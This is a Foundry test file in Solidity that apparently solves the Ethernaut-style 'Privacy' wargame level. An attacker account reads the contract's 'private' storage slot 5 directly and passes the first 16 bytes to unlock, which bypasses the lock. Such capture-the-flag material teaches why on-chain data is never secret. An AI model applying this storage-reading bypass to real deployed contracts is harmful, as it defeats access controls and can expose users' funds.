// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {Utilities} from "./utilities/Utilities.sol";
import {Privacy} from "../src/Privacy.sol";

contract PrivacyTest is Test {
    Utilities internal utils;
    Privacy internal privacy;

    bytes32[3] private data = [
        keccak256("element1"),
        keccak256("element2"),
        keccak256("element3")
    ];

    address internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);

        attacker = users[0];
        vm.label(attacker, "Attacker");

        privacy = new Privacy(
            [
                keccak256("element1"),
                keccak256("element2"),
                keccak256("element2")
            ]
        );
        vm.label(address(privacy), "Privacy");
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // loads whats stored on the slot 5 at the address
        bytes32 _data = vm.load(address(privacy), bytes32(uint256(5)));
        assertEq(privacy.locked(), true);
        privacy.unlock(bytes16(_data));
        assertEq(privacy.locked(), false);

        vm.stopPrank();
    }
}
